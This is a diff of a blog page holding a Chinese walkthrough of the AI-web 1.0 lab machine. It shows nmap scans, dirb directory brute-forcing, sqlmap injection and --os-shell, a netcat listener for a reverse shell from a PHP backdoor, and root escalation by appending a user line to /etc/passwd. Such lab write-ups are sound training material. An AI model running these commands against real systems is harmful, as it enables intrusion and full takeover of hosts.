@@ -452,51 +452,51 @@
         <h2 id="AI-web-1-0靶机学习"><a href="#AI-web-1-0靶机学习" class="headerlink" title="AI-web 1.0靶机学习"></a>AI-web 1.0靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.153</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt></p>
 <h4 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h4><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p <span class="number">1</span><span class="number">-65535</span> <span class="number">192.168</span><span class="number">.153</span><span class="number">.135</span> -T4</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185240.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185240.png" alt></p>
 <p>我们发现靶机的80端口上运行apache服务，并且发现了一个文件上传的目录</p>
 <p>我们尝试访问该ip的80端口,发现页面只有一句没什么用的话。。。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt></p>
 <h4 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h4><p>我们使用dirsearch工具尝试扫一下网站的目录。</p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb <span class="string">http:</span><span class="comment">//192.168.153.135</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt></p>
 <p>发现目录下存在robots.txt文件，我们看看里面有没有什么敏感文件。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185821.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185821.png" alt></p>
 <p>文件里给出了三个目录，我们依次进行访问，发现只有 /se3reTdir777/目录可以正常访问，发现是一个登陆点。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt></p>
 <p>我们输入任意数字，进行抓包判断，发现明显的注入点uid。使用sqlmap进行自动化扫描。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt></p>
 <h4 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h4><p>我们使用sqlmap进行自动化扫描。</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.153.135/se3reTdir777/"</span> <span class="params">--data</span> <span class="string">"uid=1&amp;peration=Submit"</span> <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>
 
 <p>得到了我们想要的数据库 aiweb1</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190647.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190647.png" alt></p>
 <p>继续对目标数据库中的表进行探测</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http:192.168.153.135/se3reTdir777/"</span><span class="params">--data</span> <span class="string">"uid=1&amp;peration=Submit"</span> -D  aiweb1 <span class="params">--tables</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190733.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190733.png" alt></p>
 <p>探测字段</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.153.135/se3reTdir777/"</span> --data <span class="string">"uid=1&amp;Operation=Submit"</span>  -D aiweb1 -T<span class="built_in"> user </span>--columns --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt></p>
 <p>发现没有我们想要的信息。。。。。。只能换思路。</p>
 <h4 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h4><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">153.135</span><span class="regexp">/m3diNf0/</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt></p>
 <p>我们发现目录下存在一个info.php，我们尝试对其进行访问。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206192302.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206192302.png" alt></p>
 <p>发现这是一个phpinfo配置页面。并且在其中发现了网站的根目录在home下。</p>
 <p>知道了网站的根目录，我们就可以尝试使用sqlmap反弹shell。</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.153.135/se3reTdir777/"</span> <span class="params">--data</span> <span class="string">"uid=1&amp;Operation=Submit"</span> <span class="params">--level=3</span> <span class="params">--os-shell</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215112454.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215112454.png" alt></p>
 <p>依次选择4:php web server</p>
 <p>​                2:custom location</p>
 <p>网站路径：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</p>
@@ -507,14 +507,14 @@
 
 
 <p>我们尝试访问本地的127.0.0.1的4567端口。发现可以正常访问目录下的文件。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114220.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114220.png" alt></p>
 <p>我们在shell下载下a.php文件。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114406.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114406.png" alt></p>
 <p>我们在kali下监听 9966端口。</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">9966</span></span><br></pre></td></tr></table></figure>
 
 <p>然后我们在使用php命令运行我们下载的php后门。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt></p>
 <p>我们可以发现kali已经成功反弹shell。</p>
 <h4 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h4><p>我们首先使用ptthon提升为交互式shell:</p>
 <figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
@@ -526,7 +526,7 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">'abc'</span>:<span class="variable">$1</span><span class="variable">$abc</span><span class="variable">$yzqAxwzjwao0BUFj9nRwF</span><span class="regexp">/:0:0::/</span>root：<span class="regexp">/bin/</span>bash<span class="string">'&gt;&gt;/etc/passwd</span></span><br></pre></td></tr></table></figure>
 
 <p>最后使用su命令切换为root用户。得到Flag.</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215115210.png" alt=""></p>
+<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215115210.png" alt></p>
 <p><strong>完</strong></p>
 
       
@@ -651,7 +651,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
